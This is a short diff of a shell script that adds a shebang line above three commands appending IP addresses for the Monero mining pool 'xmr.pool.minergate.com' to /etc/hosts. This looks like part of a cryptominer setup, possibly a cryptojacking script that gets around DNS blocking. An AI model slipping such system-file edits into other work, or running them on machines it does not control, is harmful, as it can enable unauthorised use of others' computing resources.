@@ -1,3 +1,4 @@
+#!/bin/sh
 echo "94.130.48.154 xmr.pool.minergate.com" >> /etc/hosts
 echo "78.46.23.253 xmr.pool.minergate.com" >> /etc/hosts
 echo "136.243.88.145 xmr.pool.minergate.com" >> /etc/hosts
